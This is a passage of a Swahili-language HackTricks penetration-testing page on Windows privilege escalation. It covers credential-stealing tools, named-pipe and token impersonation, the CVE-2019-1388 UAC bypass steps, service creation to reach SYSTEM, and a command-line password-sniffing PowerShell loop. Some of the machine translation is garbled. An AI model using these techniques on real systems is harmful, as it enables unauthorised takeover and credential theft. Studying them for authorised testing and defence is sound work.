[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ni program-jalizi ya msf** ambayo nimeiumba ili **kutekeleza moja kwa moja kila moduli ya metasploit POST inayotafuta nywila** ndani ya mwathiriwa.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) inatafuta moja kwa moja faili zote zinazotaja nywila zilizotajwa kwenye ukurasa huu.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ni zana nyingine nzuri ya kuchimbua nywila kutoka kwenye mfumo.

Zana [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) inatafuta **vikao**, **majina ya watumiaji**, na **nywila** za zana kadhaa ambazo huhifadhi data hii kwa wazi (PuTTY, WinSCP, FileZilla, SuperPuTTY, na RDP).
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Wavuja wa Kusimamia

Fikiria kwamba **mchakato unaoendesha kama SYSTEM unafungua mchakato mpya** (`OpenProcess()`) na **upatikanaji kamili**. Mchakato huo huo **pia hujenga mchakato mpya** (`CreateProcess()`) **na mamlaka ya chini lakini kurithi kushughulikia wazi za mchakato mkuu**.\
Kisha, ikiwa una **upatikanaji kamili wa mchakato uliopewa mamlaka ya chini**, unaweza kuchukua **kushughulikia wazi kwa mchakato uliopewa mamlaka** uliozalishwa na `OpenProcess()` na **kuingiza shellcode**.\
[Soma mfano huu kwa maelezo zaidi juu ya **jinsi ya kugundua na kutumia udhaifu huu**.](leaked-handle-exploitation.md)\
[Soma **chapisho lingine kwa maelezo kamili zaidi juu ya jinsi ya kujaribu na kutumia kushughulikia wazi za michakato na nyuzi zilizorithiwa na viwango tofauti vya ruhusa (sio upatikanaji kamili tu)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Uigaji wa Mteja wa Mipira Iliyopewa Jina

Sehemu za kumbukumbu zilizoshirikiwa, inayojulikana kama **mipira**, inawezesha mawasiliano ya mchakato na uhamishaji wa data.

Windows inatoa kipengele kinachoitwa **Mipira Iliyopewa Jina**, kuruhusu michakato isiyohusiana kushiriki data, hata juu ya mitandao tofauti. Hii inafanana na muundo wa mteja / seva, na majukumu yaliyofafanuliwa kama **seva ya mpira iliyo na jina** na **mteja wa mpira iliyo na jina**.

Wakati data inatumwa kupitia mpira na **mteja**, **seva** ambayo ilianzisha mpira ina uwezo wa **kuchukua utambulisho** wa **mteja**, ikidhani ina **haki za SeImpersonate** zinazohitajika. Kutambua mchakato uliopewa mamlaka ambao unawasiliana kupitia mpira unaweza kutoa fursa ya **kupata mamlaka ya juu** kwa kuchukua utambulisho wa mchakato huo mara tu inaposhirikiana na mpira uliowekwa. Kwa maelekezo juu ya kutekeleza shambulio kama hilo, mwongozo wenye manufaa unaweza kupatikana [**hapa**](named-pipe-client-impersonation.md) na [**hapa**](./#from-high-integrity-to-system).

Pia zana ifuatayo inaruhusu **kukamata mawasiliano ya mpira iliyo na jina na zana kama burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **na zana hii inaruhusu kuorodhesha na kuona mipira yote ili kupata uwezo wa mamlaka** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Vinginevyo

### **Kufuatilia Mistari ya Amri kwa ajili ya nywila**

Kupata kikao kama mtumiaji, kunaweza kuwa na kazi zilizopangwa au michakato mingine inayotekelezwa ambayo **inapitisha siri kwenye mstari wa amri**. Skripti ifuatayo inakamata mistari ya amri ya michakato kila baada ya sekunde mbili na kulinganisha hali ya sasa na hali ya awali, ikitoa tofauti yoyote.
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Kutoka kwa Mtumiaji wa Haki za Chini hadi NT\AUTHORITY SYSTEM (CVE-2019-1388) / Kupita UAC

Ikiwa una ufikiaji wa kiolesura cha picha (kupitia konsoli au RDP) na UAC imeamilishwa, katika baadhi ya toleo za Microsoft Windows inawezekana kuendesha terminal au mchakato mwingine kama "NT\AUTHORITY SYSTEM" kutoka kwa mtumiaji asiye na haki za juu.

Hii inawezesha kuongeza haki za mtumiaji na kuepuka UAC wakati huo huo kwa kutumia kasoro hiyo hiyo. Aidha, hakuna haja ya kufunga kitu chochote na faili inayotumiwa wakati wa mchakato huo, imehakikiwa na kutolewa na Microsoft.

Baadhi ya mifumo iliyoathiriwa ni kama ifuatavyo:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Kuendeleza udhaifu huu, ni muhimu kufuata hatua zifuatazo:

```
1) Bonyeza kulia kwenye faili ya HHUPD.EXE na uifanye kazi kama Msimamizi.

2) Wakati kisanduku cha UAC kinapoonekana, chagua "Onyesha maelezo zaidi".

3) Bonyeza "Onyesha cheti cha mtoa huduma".

4) Ikiwa mfumo ni dhaifu, unapobonyeza kiungo cha URL "Imetolewa na", kivinjari cha wavuti cha chaguo-msingi kinaweza kuonekana.

5) Subiri tovuti ipakie kabisa na chagua "Hifadhi kama" ili kuleta dirisha la explorer.exe.

6) Katika njia ya anwani ya dirisha la explorer, ingiza cmd.exe, powershell.exe au mchakato mwingine wa kuingiliana.

7) Sasa utakuwa na dirisha la amri la "NT\UTHIBITISHO WA SYSTEM".

8) Kumbuka kufuta usanidi na kisanduku cha UAC ili kurudi kwenye desktop yako.
```

Unayo faili na habari zote muhimu katika hazina ya GitHub ifuatayo:

https://github.com/jas502n/CVE-2019-1388

## Kutoka kiwango cha Msimamizi cha Kati hadi cha Juu / Kuepuka UAC

Soma hii ili **kujifunza kuhusu Viwango vya Uaminifu**:

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

Kisha **soma hii ili kujifunza kuhusu UAC na njia za kuepuka UAC:**

{% content-ref url="../windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](../windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

## **Kutoka kiwango cha Juu hadi System**

### **Huduma Mpya**

Ikiwa tayari unatumia mchakato wa Kiwango cha Juu, **kupita kwa SYSTEM** kunaweza kuwa rahisi tu kwa **kuunda na kutekeleza huduma mpya**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

Kutoka kwenye mchakato wa High Integrity unaweza kujaribu **kuwezesha kuingiza kila wakati kwa kuingiza kila wakati kwa kuingiza kila wakati** na **kufunga** kifuniko cha nyuma kwa kutumia _**.msi**_.\
[Maelezo zaidi kuhusu funguo za usajili zinazohusika na jinsi ya kufunga pakiti ya _.msi_ hapa.](./#alwaysinstallelevated)

### High + SeImpersonate kibali kwa System

**Unaweza** [**kupata nambari hapa**](seimpersonate-from-high-to-system.md)**.**

### Kutoka SeDebug + SeImpersonate hadi Token kamili ya kibali

Ikiwa una vibali vya token hivyo (labda utapata hii katika mchakato wa High Integrity tayari), utaweza **kufungua karibu mchakato wowote** (sio mchakato uliolindwa) na kibali cha SeDebug, **nakala ya token** ya mchakato, na kuunda **mchakato wa kiholela na token hiyo**.\
Kutumia mbinu hii kawaida **huchaguliwa mchakato wowote unaofanya kazi kama SYSTEM na vibali vyote vya token** (_ndio, unaweza kupata michakato ya SYSTEM bila vibali vyote vya token_).\
**Unaweza kupata** [**mfano wa nambari inayotekeleza mbinu iliyopendekezwa hapa**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Pipes Zilizoitwa**

Mbinu hii hutumiwa na meterpreter kuongeza kasi katika `getsystem`. Mbinu hii inajumuisha **kuunda bomba na kisha kuunda/tumia huduma ya kuandika kwenye bomba hilo**. Kisha, **seva** ambayo iliunda bomba kwa kutumia kibali cha **`SeImpersonate`** itaweza **kuiga token** ya mteja wa bomba (huduma) kupata vibali vya SYSTEM.\
Ikiwa unataka [**kujifunza zaidi kuhusu mabomba ya jina unapaswa kusoma hii**](./#named-pipe-client-impersonation).\
Ikiwa unataka kusoma mfano wa [**jinsi ya kwenda kutoka kwa uadilifu wa juu hadi System kwa kutumia mabomba ya jina unapaswa kusoma hii**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ikiwa unaweza **kuteka dll** inayotumiwa na **mchakato** unaofanya kazi kama **SYSTEM** utaweza kutekeleza nambari ya kiholela na vibali hivyo. Kwa hivyo Dll Hijacking pia ni muhimu kwa aina hii ya kuongeza kasi ya kibali, na, zaidi ya hayo, ikiwa mbali **ni rahisi zaidi kufikia kutoka kwa mchakato wa uadilifu wa juu** kwani itakuwa na **ruhusa za kuandika** kwenye folda zinazotumiwa kusoma dlls.\
**Unaweza** [**kujifunza zaidi kuhusu Dll hijacking hapa**](dll-hijacking.md)**.**

### **Kutoka kwa Msimamizi au Huduma ya Mtandao hadi System**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### Kutoka kwa Huduma ya Mitaa au Huduma ya Mtandao hadi vibali kamili

**Soma:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Msaada zaidi

[Imejumuishwa kwa imara](https://github.com/ropnop/impacket\_static\_binaries)

## Zana muhimu

**Zana bora ya kutafuta vekta za kuongeza kasi ya kibali cha Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **- Angalia kwa misconfigurations na faili nyeti (**[**angalia hapa**](../../windows/windows-local-privilege-escalation/broken-reference/)**). Imegunduliwa.**\
[**JAWS**](https://github.com/411Hall/JAWS) **- Angalia kwa misconfigurations fulani inayowezekana na kukusanya habari (**[**angalia hapa**](../../windows/windows-local-privilege-escalation/broken-reference/)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**- Angalia kwa misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **- Inachukua habari ya kikao kilichohifadhiwa cha PuTTY, WinSCP, SuperPuTTY, FileZilla, na RDP. Tumia -Thorough kwa mitaa.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **- Inachukua vibali kutoka kwa Meneja wa Vitambulisho. Imegunduliwa.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **- Panya nywila zilizokusanywa kote kwenye kikoa**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **- Inveigh ni chombo cha PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer na man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **- Uchunguzi wa msingi wa Windows wa kuongeza kasi ya kibali**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ - Tafuta udhaifu maarufu wa kuongeza kasi ya kibali (IMEPITWA NA WAKATI kwa Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) - Angalia za mitaa **(Inahitaji haki za Msimamizi)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) - Tafuta udhaifu maarufu wa kuongeza kasi ya kibali (inahitaji kuchapishwa kwa kutumia VisualStudio) ([**imechapishwa mapema**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) - Inataja mwenyeji kwa kutafuta misconfigurations (zaidi ya zana ya kukusanya habari kuliko kuongeza kasi ya kibali) (inahitaji kuchapishwa) **(**[**imechapishwa mapema**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **- Inachukua vibali kutoka kwa programu nyingi (exe iliyochapishwa mapema kwenye github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **- Port ya PowerUp kwenda C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ - Angalia kwa misconfigurations (exe iliyochapishwa mapema kwenye github). Haipendekezi. Haifanyi kazi vizuri katika Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) - Angalia kwa misconfigurations inayowezekana (exe kutoka kwa python). Haipendekezi. Haifanyi kazi vizuri katika Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) - Zana iliyoanzishwa kulingana na chapisho hili (haina haja ya accesschk kufanya kazi vizuri lakini inaweza kutumia).

**Mitaa**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) - Inasoma matokeo ya **systeminfo** na kupendekeza udhaifu wa kazi (python ya mitaa)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) - Inasoma matokeo ya **systeminfo** na kupendekeza udhaifu wa kazi (python ya mitaa)

**Meterpreter**

_multi/recon/local\_exploit\_suggestor_

Lazima uchapishe mradi k
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Marejeo

* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\
* [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
* [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\
* [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=\_8xJaaQlpBo)\
* [https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\
* [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\
* [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Je, unafanya kazi katika **kampuni ya usalama wa mtandao**? Je, ungependa kuona **kampuni yako ikionekana katika HackTricks**? Au ungependa kupata ufikiaji wa **toleo jipya zaidi la PEASS au kupakua HackTricks kwa muundo wa PDF**? Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee.
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* **Jiunge na** [**💬**](https://emojipedia.org/speech-balloon/) [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au **kikundi cha telegram**](https://t.me/peass) au **nifuate** kwenye **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwenye** [**repo ya hacktricks**](https://github.com/carlospolop/hacktricks) **na** [**repo ya hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
